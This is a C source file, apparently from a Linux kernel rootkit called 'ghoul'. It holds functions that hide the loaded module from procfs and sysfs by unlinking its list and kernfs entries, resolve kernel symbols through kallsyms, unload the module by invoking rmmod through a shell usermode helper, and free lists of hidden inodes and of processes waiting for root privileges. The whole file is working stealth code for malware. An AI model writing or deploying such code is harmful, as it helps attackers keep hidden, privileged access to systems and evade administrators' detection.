#include <linux/module.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include "load.h"
#include "privileges.h"
#include "hide.h"

#ifdef HIDE_MODULE_PROCFS
static struct list_head *prev_module;
int is_hidden_procfs = 0;

__always_inline void hide_module_procfs(void)
{
    if (is_hidden_procfs)
        return;
    
    pr_info("ghoul: hiding module from procfs\n");
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_hidden_procfs = 1;
}

__always_inline void show_module_procfs(void)
{
    if (!is_hidden_procfs)
        return;
    
    pr_info("ghoul: showing module in procfs\n");
    list_add(&THIS_MODULE->list, prev_module);
    is_hidden_procfs = 0;
}
#else
__always_inline void hide_module_procfs(void) {}
__always_inline void show_module_procfs(void) {}
#endif

#ifdef HIDE_MODULE_SYSFS
int is_hidden_sysfs = 0;

void (*kernfs_unlink_sibling)(struct kernfs_node *kn) = NULL;
int (*kernfs_link_sibling)(struct kernfs_node *kn) = NULL;

__always_inline void hide_module_sysfs(void)
{
    if (is_hidden_sysfs)
        return;
    
    if (kernfs_unlink_sibling == NULL)
        kernfs_unlink_sibling = (void (*)(struct kernfs_node *kn))kallsyms_lookup_name("kernfs_unlink_sibling");
    
    pr_info("ghoul: hiding module from sysfs\n");
    kernfs_unlink_sibling(THIS_MODULE->mkobj.kobj.sd);

    is_hidden_sysfs = 1;
}

__always_inline void show_module_sysfs(void)
{
    if (!is_hidden_sysfs)
        return;
    
    if (kernfs_link_sibling == NULL)
        kernfs_link_sibling = (int (*)(struct kernfs_node *kn))kallsyms_lookup_name("kernfs_link_sibling");
    
    pr_info("ghoul: showing module in sysfs\n");
    kernfs_link_sibling(THIS_MODULE->mkobj.kobj.sd);

    is_hidden_sysfs = 0;
}
#else
__always_inline void hide_module_sysfs(void) {}
__always_inline void show_module_sysfs(void) {}
#endif

notrace void hide_module(void)
{
    hide_module_procfs();
    hide_module_sysfs();
}

notrace void show_module(void)
{
    show_module_procfs();
    show_module_sysfs();
}

notrace void unload_module(void)
{
    // kernel modules cannot unload themselves directly, so a usermode helper is used
    char *argv[] = { "/bin/sh", "-c", "/sbin/rmmod ghoul", NULL };
    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}

notrace void free_allocations(void)
{
    struct pid_list *pid_entry, *temp_pid_entry;
    struct inode_list *inode_entry, *temp_inode_entry;

    // free PIDs waiting for root
    list_for_each_entry_safe(pid_entry, temp_pid_entry, &pids_waiting_for_root, list) {
        list_del(&pid_entry->list);
        kfree(pid_entry);
    }

    // free hidden inodes
    list_for_each_entry_safe(inode_entry, temp_inode_entry, &hidden_inodes, list) {
        // free excluded PIDs
        list_for_each_entry_safe(pid_entry, temp_pid_entry, &inode_entry->excluded_pids, list) {
            list_del(&pid_entry->list);
            kfree(pid_entry);
        }
        list_del(&inode_entry->list);
        kfree(inode_entry);
    }
}